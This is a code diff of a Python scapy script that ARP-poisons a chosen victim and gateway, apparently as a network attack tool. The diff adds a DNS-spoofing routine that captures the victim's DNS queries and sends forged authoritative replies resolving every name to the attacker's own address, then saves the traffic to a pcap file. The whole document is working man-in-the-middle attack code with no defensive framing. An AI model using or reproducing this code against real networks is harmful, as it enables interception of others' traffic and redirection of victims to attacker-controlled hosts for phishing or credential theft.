@@ -1,6 +1,8 @@
 from multiprocessing import Process, Event
-from scapy.all import srp, conf, send, sniff, wrpcap
+from scapy.all import srp, conf, send, sniff, wrpcap, get_if_addr, sendp
 from scapy.layers.l2 import ARP, Ether
+from scapy.layers.inet import IP, UDP
+from scapy.layers.dns import DNS, DNSRR
 
 import sys
 import time
@@ -10,6 +12,8 @@ import logging
 event = Event()
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+default_if = "Беспроводная сеть"
 
 
 def get_mac(target_ip):
@@ -21,15 +25,39 @@ def get_mac(target_ip):
 
 
 class Arper:
-	def __init__(self, victim, gateway, interface="Беспроводная сеть"):
+	def __init__(self, victim, gateway, interface):
 		self.victim = victim
 		self.victim_mac = get_mac(victim)
 		self.gateway = gateway
 		self.gateway_mac = get_mac(gateway)
 		self.interface = interface
+		self.me = get_if_addr(interface)
 
 		conf.iface = interface
 		conf.verb = 0
+
+	def handle(self, pkt):
+		eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
+
+		ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+
+		udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
+
+		dns = DNS(
+			id=pkt[DNS].id,
+			qd=pkt[DNS].qd,
+			aa=1, rd=0, qr=1,
+			qdcount=1, ancount=1, nscount=0, arcount=0,
+			ar=DNSRR(
+				rrname=pkt[DNS].qd.qname,
+				type='A',
+				ttl=600,
+				rdata=self.me)
+		)
+
+		response_packet = eth / ip / udp / dns
+
+		sendp(response_packet, iface=self.interface, verbose=False)
 
 	def poison(self, e):
 		poison_victim_packet = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
@@ -52,31 +80,39 @@ class Arper:
 
 	def sniff(self, e):
 		time.sleep(5)
+
 		print(f"Sniffing packets")
-		bpf_filter = "ip host %s and udp and port 53" % self.victim
-		packets = sniff(filter=bpf_filter, stop_filter=lambda x: e.is_set(), iface=self.interface)
+		bpf_filter = "src host %s and udp and dst port 53" % self.victim
+		packets = sniff(
+			prn=self.handle,
+			filter=bpf_filter,
+			stop_filter=lambda _: e.is_set(),
+			iface=self.interface
+		)
+
 		wrpcap("arper.pcap", packets)
 		print("Saved to arper.pcap")
 		sys.exit(0)
 
 	def restore(self):
-		send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
-			op=2,
-			psrc=self.gateway,
-			hwsrc=self.gateway_mac,
-			pdst=self.victim,
-			hwdst="ff:ff:ff:ff:ff:ff"),
-			count=5,
-			verbose=False)
-		send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
-			op=2,
-			psrc=self.victim,
-			hwsrc=self.victim_mac,
-			pdst=self.gateway,
-			hwdst="ff:ff:ff:ff:ff:ff"),
-			count=5,
-			verbose=False)
-		print("ARP tables restored")
+		print("Restoring ARP tables...")
+		for i in range(10):
+			send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
+				op=2,
+				psrc=self.gateway,
+				hwsrc=self.gateway_mac,
+				pdst=self.victim,
+				hwdst="ff:ff:ff:ff:ff:ff"),
+				verbose=False)
+			send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
+				op=2,
+				psrc=self.victim,
+				hwsrc=self.victim_mac,
+				pdst=self.gateway,
+				hwdst="ff:ff:ff:ff:ff:ff"),
+				verbose=False)
+			time.sleep(2)
+		print("ARP tables restored!")
 
 
 if __name__ == "__main__":
@@ -85,7 +121,7 @@ if __name__ == "__main__":
 		exit(0)
 
 	if len(sys.argv) == 3:
-		myarp = Arper(sys.argv[1], sys.argv[2])
+		myarp = Arper(sys.argv[1], sys.argv[2], default_if)
 	else:
 		myarp = Arper(sys.argv[1], sys.argv[2], sys.argv[3])
 
@@ -102,4 +138,3 @@ if __name__ == "__main__":
 
 	sniff_process.join()
 	poison_process.join()
-	print("Program finished")
